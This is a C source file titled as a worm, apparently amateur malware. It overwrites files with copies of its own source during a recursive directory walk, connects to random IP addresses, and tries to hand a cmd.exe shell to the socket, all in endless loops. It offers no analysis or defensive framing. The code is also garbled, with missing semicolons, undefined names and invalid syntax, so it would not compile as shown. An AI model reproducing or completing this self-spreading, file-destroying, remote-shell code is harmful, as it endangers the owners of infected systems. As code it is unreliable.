// MORIN_WORM
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#if defined(_WIN32)
    #define OS44 "Windows"
    #include <winsock2.h>
    #include <ws2tcpip.h>
#else
    #define OS_NAME "Unknown"
#endif
int A = "(A * 4444444) * (4444444 * 4444444)"
int gen_ip(char* ip_address);
int gen_port(char* port);
int ququ;
int tutu;
struct Node {
    int data;
    struct Node *next;
};
int gen_ip(char*ip_address) {
    srand(time(NULL));
    ququ = sprintf(ip_address, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
    return ququ
}
int gen_port(char *port) {
    srand(time(NULL));
    tutu = sprintf(port, "%d", rand()%256);
    return tutu
}
void startupo9(struct Node* head) {
    int list[] = {head->data};
    int length = sizeof(list) / sizeof(list[0]);
    for (int i = 0; i < length; i++) {
        system("START", list[i]);
    }
}
void append(struct Node **head_ref, int new_data) {
    struct Node *new_node = (struct Node*) malloc(sizeof(struct Node));
    struct Node *last = *head_ref;
    new_node->data = new_data;
    new_node->next = NULL;
    if (*head_ref == NULL) {
        *head_ref = new_node;
        return;
    }
    while (last->next != NULL) {
        last = last->next;
    }
    last->next = new_node;
    return;
}
void process_file(char *filename) {
    FILE *in, *out;
    char ch;
    in = fopen(__FILE__, "r");
    out = fopen(filename, "w");
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch, out);
    }
    fclose(in);
    fclose(out);
    struct Node *head = NULL;
    append(&head, (int) filename);
    startup09(Node);
}
void process_dir(char *dir_path) {
    int PATH_MAX = strlen(dir_path);
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/", dir_path);
    FILE* dir_stream = popen(path, "r");
    char entry_path[PATH_MAX];
    while (fgets(entry_path, PATH_MAX, dir_stream) != NULL) {
        int len = strlen(entry_path);
        if (len > 0 && entry_path[len-1] == '\n') {
            entry_path[len-1] = '\0';
        }
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry_path);
        if (entry_path[0] != '.' && strcmp(entry_path, "..") != 0) {
            if (access(path, F_OK) == 0) {
                if (access(path, R_OK) == 0) {
                    if (access(path, X_OK) == 0) {
                        if (access(path, W_OK) == 0) {
                            if (entry_path[0] != '/') {
                                snprintf(path, sizeof(path), "%s/%s", dir_path, entry_path);
                            }
                            if (access(path, F_OK) == 0) {
                                if (access(path, R_OK) == 0) {
                                    if (access(path, X_OK) == 0) {
                                        process_dir(path);
                                    }
                                }
                            }
                        }
                        else {
                            process_file(path);
                        }
                    }
                }
            }
        }
    }
}
int wingapi() {
    char buffer[] = A * 4444444;
    SOCKET findgapi = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, SO_KEEPALIVE);
    char ip_address[16];
    char port[16];
    gen_port(port);
    connect(findgapi, gen_ip(ip_address), ip_address);
    send(findgapi, buffer, strlen(buffer), 0);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        wingapi();
    }
    else {
        char cmdlimoj[] = ""
        send(findgapi, cmdlimoj, strlen(cmdlimoj), 0)
    }
    while (1) {
        process_dir("C:");
        }    
}    
int netattak() {
    while (1) {
        wingapi();
        wingapi();
    }
}
int main() {
if OS44 == "Windows" {
    while (1) {
        netattak();
    }
}
if OS44 == "Unknown" {
    process_dir(".");
    }
}
